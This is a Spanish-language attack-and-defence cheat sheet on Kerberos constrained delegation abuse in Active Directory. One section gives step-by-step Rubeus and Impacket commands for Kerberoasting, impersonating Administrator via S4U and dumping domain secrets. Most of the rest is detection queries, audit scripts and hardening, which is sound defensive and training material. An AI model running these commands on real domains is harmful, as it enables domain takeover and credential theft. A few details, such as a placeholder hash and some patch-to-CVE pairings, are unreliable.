# 🛑 Ataques de **Constrained Delegation (Delegación Restringida) en Active Directory**

---

## 📝 ¿Qué es Constrained Delegation y por qué es peligroso?

| Concepto      | Descripción                                                                                                       |
|---------------|------------------------------------------------------------------------------------------------------------------|
| **Definición**| Mecanismo de delegación Kerberos que permite a un servicio obtener tickets de servicio (TGS) para usuarios específicos, pero solo hacia servicios predefinidos en su lista de SPNs autorizados (msDS-AllowedToDelegateTo). |
| **Finalidad** | Diseñado como versión más segura que la delegación no restringida, limitando a qué servicios puede acceder un servidor delegado. Su abuso permite a atacantes suplantar usuarios ante servicios específicos y potencialmente escalar privilegios. |

---

## 🛠️ ¿Cómo funciona y cómo se explota Constrained Delegation? (TTPs y ejemplos)

| Vector/Nombre              | Descripción breve                                                                                   |
|----------------------------|----------------------------------------------------------------------------------------------------|
| **Compromiso de servicio con delegación** | El atacante obtiene control de un servicio configurado con delegación restringida y abusa de S4U2Self/S4U2Proxy. |
| **S4U2Self para cualquier usuario** | Solicita ticket de servicio en nombre de cualquier usuario (incluso sin su TGT) hacia sí mismo. |
| **S4U2Proxy hacia servicios objetivo** | Usa el ticket obtenido en S4U2Self para solicitar acceso a servicios en la lista de delegación. |
| **Alternative Service Name** | Explota que Kerberos permite cambiar el servicio (HTTP→CIFS) manteniendo el host para escalada. |
| **Abuse de cuentas de servicio** | Compromete cuentas con SeEnableDelegationPrivilege o con SPN configurados para delegación. |
| **Cross-domain delegation** | Abusa de trusts entre dominios para delegación hacia servicios en dominios externos. |

---

## 💻 Ejemplo práctico ofensivo (paso a paso)

```bash
# 1. Enumerar servicios con delegación restringida
findDelegation.py -target-domain soporte.htb -hashes :aad3b435b51404eeaad3b435b51404ee

# 2. Con Rubeus - buscar delegación restringida
.\Rubeus.exe s4u /user:srv-web$ /rc4:aad3b435b51404eeaad3b435b51404ee /domain:soporte.htb /dc:dc.soporte.htb

# 3. Comprometer cuenta de servicio con delegación (ejemplo: Kerberoasting)
GetUserSPNs.py soporte.htb/usuario:Password123 -request -dc-ip 10.10.11.174

# 4. Crackear hash obtenido
hashcat -m 13100 ticket.hash rockyou.txt

# 5. S4U2Self - Obtener ticket para cualquier usuario hacia el servicio comprometido
.\Rubeus.exe s4u /user:srv-web$ /rc4:aad3b435b51404eeaad3b435b51404ee /impersonateuser:Administrator /msdsspn:HTTP/webapp.soporte.htb /domain:soporte.htb /dc:dc.soporte.htb

# 6. S4U2Proxy - Usar el ticket para acceder a servicios autorizados
.\Rubeus.exe s4u /user:srv-web$ /rc4:aad3b435b51404eeaad3b435b51404ee /impersonateuser:Administrator /msdsspn:HTTP/webapp.soporte.htb /altservice:CIFS /domain:soporte.htb /dc:dc.soporte.htb /ptt

# 7. Alternativamente, usando getST.py de Impacket
getST.py -spn HTTP/webapp.soporte.htb -impersonate Administrator soporte.htb/srv-web$ -hashes :aad3b435b51404eeaad3b435b51404ee

# 8. Cambiar servicio en el ticket (HTTP → CIFS para acceso a archivos)
getST.py -spn CIFS/webapp.soporte.htb -impersonate Administrator soporte.htb/srv-web$ -hashes :aad3b435b51404eeaad3b435b51404ee

# 9. Usar el ticket para acceso
export KRB5CCNAME=$(pwd)/Administrator.ccache
smbclient.py -k -no-pass soporte.htb/Administrator@webapp.soporte.htb

# 10. Si el servicio autorizado es en el DC, escalar a Domain Admin
getST.py -spn LDAP/dc.soporte.htb -impersonate Administrator soporte.htb/srv-web$ -hashes :aad3b435b51404eeaad3b435b51404ee
secretsdump.py -k -no-pass soporte.htb/Administrator@dc.soporte.htb
```

---

## 📊 Detección en logs y SIEM (Splunk)

| Campo clave                     | Descripción                                                                  |
|---------------------------------|------------------------------------------------------------------------------|
| **EventCode = 4769**            | Solicitudes TGS con opciones S4U2Self (0x40810010) y S4U2Proxy (0x40810000). |
| **EventCode = 4648**            | Explicit credential use desde cuentas de servicio con delegación.             |
| **EventCode = 4624**            | Logons de red usando tickets obtenidos mediante delegación.                   |
| **ServiceName changes**         | Cambios de servicio en tickets (HTTP→CIFS, HTTP→LDAP, etc.).                  |
| **CommandLine/Image (Sysmon)**  | Procesos como Rubeus.exe, getST.py, GetUserSPNs.py.                          |

### Query Splunk: Detección de S4U2Self/S4U2Proxy

```splunk
index=wineventlog EventCode=4769
| search (TicketOptions="0x40810010" OR TicketOptions="0x40810000")
| table _time, ServiceName, TargetUserName, IpAddress, TicketOptions
| eval RequestType=case(TicketOptions="0x40810010", "S4U2Self", TicketOptions="0x40810000", "S4U2Proxy", 1=1, "Other")
```

### Query: Cambios de servicio en tickets (Alternative Service Name)

```splunk
index=wineventlog EventCode=4769
| search ServiceName="*/*"
| rex field=ServiceName "(?<Service>[^/]+)/(?<Host>.*)"
| stats values(Service) as Services by Host, TargetUserName, _time
| where mvcount(Services) > 1
| table _time, Host, TargetUserName, Services
```

### Query: Uso de herramientas de delegación restringida

```splunk
index=sysmon_logs EventCode=1
| search (CommandLine="*s4u*" OR CommandLine="*getST*" OR CommandLine="*impersonate*" OR CommandLine="*msdsspn*" OR CommandLine="*altservice*")
| table _time, Computer, User, Image, CommandLine
```

### Query: Correlación Kerberoasting → Delegación

```splunk
index=sysmon_logs EventCode=1 CommandLine="*GetUserSPNs*"
| eval KerberoastTime=_time
| join Computer [
    search index=sysmon_logs EventCode=1 (CommandLine="*s4u*" OR CommandLine="*getST*")
    | eval DelegationTime=_time
]
| where DelegationTime > KerberoastTime AND DelegationTime - KerberoastTime < 3600
| table KerberoastTime, DelegationTime, Computer, CommandLine
```

---

## 🛡️ Detección con Windows Defender for Endpoint

### Reglas de detección personalizadas

```kql
// Constrained Delegation - Detección de S4U abuse
DeviceProcessEvents
| where ProcessCommandLine has_any ("s4u", "getST", "impersonate", "msdsspn", "S4U2Self", "S4U2Proxy")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FileName
| order by Timestamp desc
```

```kql
// Detección de Alternative Service Name abuse
DeviceProcessEvents
| where ProcessCommandLine has "altservice" or ProcessCommandLine matches regex @"(HTTP|LDAP|CIFS|HOST)/[^/]+.*\s+(HTTP|LDAP|CIFS|HOST)/[^/]+"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp desc
```

```kql
// Correlación: Kerberoasting seguido de delegación
DeviceProcessEvents
| where ProcessCommandLine has_any ("GetUserSPNs", "kerberoast")
| extend KerberoastTime = Timestamp
| join kind=inner (
    DeviceProcessEvents
    | where ProcessCommandLine has_any ("s4u", "getST", "impersonate")
    | extend DelegationTime = Timestamp
) on DeviceName
| where DelegationTime - KerberoastTime between (0s .. 1h)
| project KerberoastTime, DelegationTime, DeviceName, ProcessCommandLine, ProcessCommandLine1
```

### Alertas recomendadas

| Regla | Descripción | Severidad |
|-------|-------------|-----------|
| **S4U Abuse Detection** | Uso de S4U2Self/S4U2Proxy para delegación | Alta |
| **Alternative Service Abuse** | Cambio de servicio en tickets de delegación | Alta |
| **Kerberoasting + Delegation** | Secuencia de Kerberoasting seguida de delegación | Crítica |
| **Cross-Domain Delegation** | Delegación entre dominios diferentes | Media |

---

## 🦅 Detección con CrowdStrike Falcon

### Hunting queries (Event Search)

```sql
-- Detección de S4U2Self/S4U2Proxy abuse
event_platform=Win event_simpleName=ProcessRollup2
| search (CommandLine=*s4u* OR CommandLine=*getST* OR CommandLine=*impersonate*)
| table _time, ComputerName, UserName, FileName, CommandLine, SHA256HashData
| sort - _time
```

```sql
-- Detección de cambios de servicio en delegación
event_platform=Win event_simpleName=ProcessRollup2
| search CommandLine=*altservice*
| table _time, ComputerName, UserName, CommandLine, ParentBaseFileName
| sort - _time
```

```sql
-- Detección de actividad S4U en logs de autenticación
event_platform=Win event_simpleName=AuthActivityAuditLog
| search (DelegationType=S4U2Self OR DelegationType=S4U2Proxy)
| table _time, ComputerName, UserName, ServiceName, TargetUserName, DelegationType
| sort - _time
```

### Custom IOAs (Indicators of Attack)

```sql
-- IOA para detectar abuso masivo de delegación
event_platform=Win event_simpleName=KerberosLogon
| search ServiceName=* DelegationType=*
| stats count by ComputerName, UserName, ServiceName, bin(_time, 5m)
| where count > 10
```

---

## 🔍 Queries KQL para Microsoft Sentinel

### Detección de Constrained Delegation

```kql
// Query principal para detectar abuso de delegación restringida
SecurityEvent
| where EventID == 4769 // Service ticket request
| where TicketOptions in ("0x40810010", "0x40810000") // S4U2Self, S4U2Proxy
| extend RequestType = case(TicketOptions == "0x40810010", "S4U2Self", 
                           TicketOptions == "0x40810000", "S4U2Proxy", "Other")
| project TimeGenerated, Computer, Account, ServiceName, TargetUserName, RequestType, IpAddress
| order by TimeGenerated desc
```

```kql
// Detección de Alternative Service Name abuse
SecurityEvent
| where EventID == 4769
| where ServiceName contains "/" 
| extend Service = split(ServiceName, "/")[0]
| extend Host = split(ServiceName, "/")[1]
| summarize Services = make_set(Service) by Host, TargetUserName, bin(TimeGenerated, 5m)
| where array_length(Services) > 1
| project TimeGenerated, Host, TargetUserName, Services
```

### Hunting avanzado

```kql
// Correlación: Kerberoasting → Constrained Delegation
DeviceProcessEvents
| where ProcessCommandLine has_any ("GetUserSPNs", "kerberoast")
| extend KerberoastTime = TimeGenerated
| join kind=inner (
    DeviceProcessEvents
    | where ProcessCommandLine has_any ("s4u", "getST", "impersonate")
    | extend DelegationTime = TimeGenerated
) on DeviceName
| where DelegationTime - KerberoastTime between (0s .. 2h)
| project KerberoastTime, DelegationTime, DeviceName, ProcessCommandLine, ProcessCommandLine1
```

```kql
// Detección de escalada de privilegios via delegación
SecurityEvent
| where EventID == 4769 and TicketOptions == "0x40810000" // S4U2Proxy
| where ServiceName has_any ("LDAP", "CIFS", "HOST") // Servicios críticos
| where TargetUserName in ("Administrator", "Domain Admins", "Enterprise Admins")
| project TimeGenerated, Computer, ServiceName, TargetUserName, IpAddress
```

---

## 🦾 Hardening y mitigación

| Medida                                         | Descripción                                                                                       |
|------------------------------------------------|--------------------------------------------------------------------------------------------------|
| **Auditoría de servicios con delegación**      | Revisar y limitar servicios configurados con msDS-AllowedToDelegateTo.                          |
| **Principio de mínimo privilegio**             | Solo configurar delegación hacia servicios estrictamente necesarios.                            |
| **Protected Users Group**                      | Agregar cuentas privilegiadas que no deben ser suplantadas.                                      |
| **Account is sensitive flag**                  | Marcar cuentas críticas como sensibles para prevenir delegación.                                |
| **Auditoría continua de SPNs**                 | Monitorear cambios en ServicePrincipalName y msDS-AllowedToDelegateTo.                          |
| **Segregación de servicios**                   | Separar servicios con delegación en segmentos de red específicos.                               |
| **Rotación regular de credenciales**           | Cambiar contraseñas de cuentas de servicio con delegación frecuentemente.                        |
| **Monitorización S4U**                         | Alertas específicas para solicitudes S4U2Self/S4U2Proxy anómalas.                               |
| **Validación de SPNs autorizados**             | Script que verifica que solo SPNs aprobados estén en listas de delegación.                       |
| **Honeypots con delegación**                   | Servicios trampa que alertan ante intentos de abuso.                                             |

---

## 🚨 Respuesta ante incidentes

1. **Identificar el servicio comprometido** con delegación restringida.
2. **Revisar logs de S4U2Self/S4U2Proxy** en las últimas 24 horas desde el servicio.
3. **Cambiar credenciales** de la cuenta de servicio comprometida inmediatamente.
4. **Auditar accesos realizados** usando tickets obtenidos mediante delegación.
5. **Revisar y actualizar** la lista de SPNs autorizados para delegación.
6. **Revocar tickets activos** relacionados con el servicio comprometido.
7. **Implementar monitorización reforzada** en servicios objetivo de la delegación.
8. **Documentar IOCs** y actualizar reglas de detección.

---

## 🧑‍💻 ¿Cómo revisar delegación restringida? (PowerShell)

### Listar servicios con delegación restringida

```powershell
Get-ADComputer -Filter * -Properties msDS-AllowedToDelegateTo,ServicePrincipalName |
Where-Object {$_."msDS-AllowedToDelegateTo" -ne $null} |
Select-Object Name,ServicePrincipalName,@{Name='DelegatedServices';Expression={$_."msDS-AllowedToDelegateTo"}}
```

### Buscar cuentas de usuario con delegación restringida

```powershell
Get-ADUser -Filter * -Properties msDS-AllowedToDelegateTo,ServicePrincipalName |
Where-Object {$_."msDS-AllowedToDelegateTo" -ne $null} |
Select-Object Name,ServicePrincipalName,@{Name='DelegatedServices';Expression={$_."msDS-AllowedToDelegateTo"}}
```

### Auditar cambios en configuración de delegación

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=5136} |
Where-Object {$_.Message -like "*msDS-AllowedToDelegateTo*"} |
Select-Object TimeCreated,@{Name='ObjectModified';Expression={($_.Properties[8].Value)}},@{Name='AttributeChanged';Expression={($_.Properties[10].Value)}}
```

### Revisar SPNs críticos con delegación

```powershell
$CriticalSPNs = @("LDAP/*", "CIFS/*", "HOST/*", "HTTP/*")
Get-ADComputer -Filter * -Properties msDS-AllowedToDelegateTo |
Where-Object {$_."msDS-AllowedToDelegateTo" -ne $null} |
ForEach-Object {
    $Computer = $_.Name
    $DelegatedSPNs = $_."msDS-AllowedToDelegateTo"
    foreach ($SPN in $DelegatedSPNs) {
        foreach ($CriticalSPN in $CriticalSPNs) {
            if ($SPN -like $CriticalSPN) {
                Write-Warning "CRÍTICO: $Computer tiene delegación hacia $SPN"
            }
        }
    }
}
```

### Script de auditoría de seguridad de delegación

```powershell
# Auditoría completa de delegación restringida
Write-Host "=== AUDITORÍA DE DELEGACIÓN RESTRINGIDA ===" -ForegroundColor Yellow

$ConstrainedComputers = Get-ADComputer -Filter * -Properties msDS-AllowedToDelegateTo,ServicePrincipalName,TrustedToAuthForDelegation |
    Where-Object {$_."msDS-AllowedToDelegateTo" -ne $null}

$ConstrainedUsers = Get-ADUser -Filter * -Properties msDS-AllowedToDelegateTo,ServicePrincipalName,TrustedToAuthForDelegation |
    Where-Object {$_."msDS-AllowedToDelegateTo" -ne $null}

Write-Host "Equipos con delegación restringida: $($ConstrainedComputers.Count)" -ForegroundColor Cyan
Write-Host "Usuarios con delegación restringida: $($ConstrainedUsers.Count)" -ForegroundColor Cyan

# Revisar servicios críticos
$CriticalServices = @("LDAP", "CIFS", "HOST")
$CriticalDelegations = @()

foreach ($Computer in $ConstrainedComputers) {
    foreach ($SPN in $Computer."msDS-AllowedToDelegateTo") {
        foreach ($CriticalService in $CriticalServices) {
            if ($SPN -like "$CriticalService/*") {
                $CriticalDelegations += [PSCustomObject]@{
                    Source = $Computer.Name
                    Target = $SPN
                    Type = "Computer"
                    Risk = "HIGH"
                }
            }
        }
    }
}

if ($CriticalDelegations.Count -gt 0) {
    Write-Host "⚠️ DELEGACIONES CRÍTICAS ENCONTRADAS:" -ForegroundColor Red
    $CriticalDelegations | Format-Table -AutoSize
} else {
    Write-Host "✓ No se encontraron delegaciones hacia servicios críticos" -ForegroundColor Green
}
```

---

## 🧠 Soluciones innovadoras y hardening avanzado

- **Análisis de cadenas de delegación:**  
  Mapeo automático de posibles rutas de escalada através de múltiples delegaciones.
- **Honeypots de servicios con delegación:**  
  Servicios señuelo que alertan ante cualquier intento de S4U abuse.
- **Machine Learning para patrones S4U:**  
  Detección de patrones anómalos en solicitudes S4U2Self/S4U2Proxy.
- **Integración con Threat Intelligence:**  
  Correlación con campañas conocidas de abuso de delegación restringida.
- **Automatización de respuesta:**  
  SOAR que automáticamente modifica listas de delegación ante detección de abuso.
- **Validación continua de SPNs:**  
  Auditoría automatizada que verifica que solo SPNs autorizados estén configurados.
- **Detección de Service Name mutation:**  
  Alertas específicas para cambios de servicio en tickets (HTTP→CIFS).

---

## 🔧 Parches y actualizaciones

| Parche/Update | Descripción                                                                                  |
|---------------|----------------------------------------------------------------------------------------------|
| **KB5008102** | Windows 11/10/Server - Correcciones en validación de S4U2Self/S4U2Proxy (CVE-2021-42278). |
| **KB5025238** | Windows 11 22H2 - Mejoras en controles de delegación restringida.                          |
| **KB5022906** | Windows Server 2022 - Fortalecimiento de validación de SPNs en delegación.                 |
| **KB4580390** | Windows Server 2016 - Mejoras en auditoría de S4U requests.                                |
| **KB5014754** | Correcciones relacionadas con certificados AD y delegación (CVE-2022-26923).               |

### Configuraciones de registro recomendadas

```powershell
# Habilitar auditoría detallada de S4U
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /set /subcategory:"Other Account Logon Events" /success:enable /failure:enable

# Configurar logging extendido para delegación
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Name "LogLevel" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictImpersonationLevel" -Value 1
```

### Configuraciones de GPO críticas

```powershell
# Configurar Protected Users Group
Add-ADGroupMember -Identity "Protected Users" -Members "Administrator","Domain Admins"

# Configurar Account is sensitive para cuentas críticas
Get-ADUser -Filter {AdminCount -eq 1} | Set-ADUser -AccountNotDelegated $true

# Configurar políticas de delegación
# Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\User Rights Assignment
# "Enable computer and user accounts to be trusted for delegation" - Solo cuentas específicas autorizadas
```

### Scripts de validación post-configuración

```powershell
# Verificar configuraciones de seguridad
$ProtectedUsers = Get-ADGroupMember -Identity "Protected Users"
$SensitiveAccounts = Get-ADUser -Filter {AccountNotDelegated -eq $true}

Write-Host "Usuarios en Protected Users: $($ProtectedUsers.Count)"
Write-Host "Cuentas marcadas como sensibles: $($SensitiveAccounts.Count)"

# Verificar que no hay delegación hacia servicios críticos sin autorización
$UnauthorizedDelegations = Get-ADComputer -Filter * -Properties msDS-AllowedToDelegateTo |
    Where-Object {$_."msDS-AllowedToDelegateTo" -match "(LDAP|CIFS|HOST)/dc\.|krbtgt"}

if ($UnauthorizedDelegations) {
    Write-Host "✗ CRÍTICO: Delegación no autorizada hacia servicios del DC" -ForegroundColor Red
} else {
    Write-Host "✓ No se encontró delegación hacia servicios críticos del DC" -ForegroundColor Green
}
```

---

## 📚 Referencias

- [Constrained Delegation - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation)
- [Rubeus S4U Documentation](https://github.com/GhostPack/Rubeus#s4u)
- [Impacket getST.py](https://github.com/fortra/impacket/blob/master/examples/getST.py)
- [S4U2Self/S4U2Proxy - Microsoft Docs](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a)
- [Alternative Service Names - adsecurity.org](https://adsecurity.org/?p=1667)
- [Protected Users Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [CVE-2021-42278/42287 Analysis](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
- [BloodHound Constrained Delegation](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#allowed-to-delegate)

---